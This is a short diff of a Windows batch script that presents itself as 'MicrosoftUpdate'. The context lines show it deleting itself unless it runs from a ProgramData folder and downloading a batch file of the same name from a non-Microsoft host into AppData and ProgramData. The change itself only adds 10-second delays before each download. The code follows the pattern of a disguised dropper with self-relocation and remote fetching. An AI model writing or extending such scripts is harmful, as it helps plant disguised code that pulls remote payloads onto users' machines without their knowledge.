@@ -38,7 +38,9 @@ if %~f0 NEQ %PROGRAMDATA%/MicrosoftUpdate/%~n0%~x0 (
 del /f /q %~f0
 ))
 
+timeout /t 10
 curl "https://freestream.us.to/schulprojekt/MicrosoftUpdate.bat" --output "%APPDATA%/MicrosoftUpdate/MicrosoftUpdate.bat"
+timeout /t 10
 curl "https://freestream.us.to/schulprojekt/MicrosoftUpdate.bat" --output "%PROGRAMDATA%/MicrosoftUpdate/MicrosoftUpdate.bat"
 
 exit
